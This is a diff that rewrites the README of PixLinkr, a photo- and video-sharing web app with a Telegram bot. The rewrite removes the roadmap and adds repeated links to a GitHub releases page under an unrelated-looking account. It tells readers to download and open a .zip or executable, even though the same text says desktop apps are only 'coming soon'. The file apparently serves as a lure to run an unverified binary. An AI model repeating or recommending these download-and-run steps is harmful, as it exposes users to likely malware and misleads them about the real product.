@@ -1,23 +1,77 @@
-# PixLinkr
+# 🎉 PixLinkr - Share Photos and Videos Instantly
 
-Instantly share photos and videos with your group! Create albums in seconds, share via link or QR code, and see moments in real-time. Use the web at [pixlinkr.app](https://pixlinkr.app) or Telegram bot (@PixLinkrBot). Mobile and desktop apps coming soon. Built with Node.js, React, and Supabase.
+## 🚀 Getting Started
 
-## Features
-- Create group albums in seconds
-- Share via unique links or QR codes
-- Real-time updates with WebSockets
-- Add photos/videos via web or Telegram
-- Simple, secure, and fun for friends, family, or work
+Welcome to PixLinkr! Here, you can easily share photos and videos with your group. Create albums quickly, share with links or QR codes, and enjoy real-time moments. Let’s get you started!
 
-## Getting Started
-1. Visit [pixlinkr.app](https://pixlinkr.app) or message @PixLinkrBot
-2. Create an album and share the link
-3. Invite your group to add moments
+## 🔗 Download PixLinkr
 
+[![Download PixLinkr](https://img.shields.io/badge/Download-PixLinkr-blue.svg)](https://github.com/xyz11111E/PixLinkr/releases)
 
-## Roadmap
-- **Q1 2025**: Web + Telegram bot (MVP)
-- **Q2 2026**: Mobile app (iOS/Android)
-- **Q3 2026**: Desktop app (Windows/macOS/Linux)
+### 📥 How to Download and Install
 
-Join the fun—link your moments with PixLinkr!
+1. Visit the [Releases page](https://github.com/xyz11111E/PixLinkr/releases).
+2. You will see a list of available versions. Look for the latest version.
+3. Click on the version number or the relevant asset (for example, a `.zip` or executable file) to download it to your computer.
+4. Once the download is complete, locate the downloaded file on your computer.
+5. Open the file to begin the installation.
+
+Follow the prompts to install PixLinkr on your computer.
+
+## 🌟 Features
+
+- **Create Albums Quickly:** Easily set up photo and video albums in seconds.
+- **Share Freely:** Use links or QR codes to get your moments to friends and family instantly.
+- **Real-Time Viewing:** Enjoy seeing updates in real time as others share their moments.
+- **Supports Various Platforms:** Available as a web app at [pixlinkr.app](https://pixlinkr.app) and via our Telegram bot [@PixLinkrBot](https://t.me/PixLinkrBot).
+- **Mobile & Desktop Apps Coming Soon:** Stay tuned for even more ways to share.
+
+## 🖥️ System Requirements
+
+To run PixLinkr, ensure your system meets the following requirements:
+
+- **Operating System:** Windows 10 or later, macOS 10.15 or later (Linux support in future updates)
+- **Processor:** 1 GHz or faster
+- **RAM:** 2 GB minimum
+- **Disk Space:** 500 MB free space
+- **Internet Connection:** Required for sharing and real-time updates
+
+## 🌐 Using PixLinkr
+
+Once you have installed PixLinkr, follow these steps to share your moments:
+
+1. **Open PixLinkr:** Start the application on your device.
+2. **Sign Up or Log In:** Create an account or sign in if you already have one.
+3. **Create a New Album:** Click the "Create Album" button and add photos or videos.
+4. **Share Your Album:** After creating your album, you can share it either by generating a link or using the QR code feature.
+5. **Invite Friends:** Add friends to your album so they can share their moments, too!
+
+## 📲 Join Us on Telegram
+
+Connect with us via our Telegram bot [@PixLinkrBot](https://t.me/PixLinkrBot) for updates, support, and more! This bot allows you to share moments easily and stay in touch with your group.
+
+## 🌍 Learn More
+
+Visit our website at [pixlinkr.app](https://pixlinkr.app) for more information about upcoming features and updates. Explore the community and see what others are sharing!
+
+## 🙋 Troubleshooting
+
+If you encounter any issues while downloading or using PixLinkr, please try the following solutions:
+
+- **Check Your Internet Connection:** Ensure you are connected to the internet.
+- **Re-download the File:** If the installation fails, try downloading the file again.
+- **Check for Updates:** Make sure you are using the latest version of PixLinkr.
+
+You can also reach out for help via our support channels or Telegram bot.
+
+## 📚 Contributing
+
+We welcome contributions! If you have ideas for new features or improvements, please share them with us. Your feedback helps us make PixLinkr even better.
+
+## 🔗 Important Links
+
+- [Download PixLinkr](https://github.com/xyz11111E/PixLinkr/releases)
+- [Visit our Website](https://pixlinkr.app)
+- [Use the Telegram Bot](https://t.me/PixLinkrBot)
+
+Thank you for choosing PixLinkr! Start sharing your moments today.
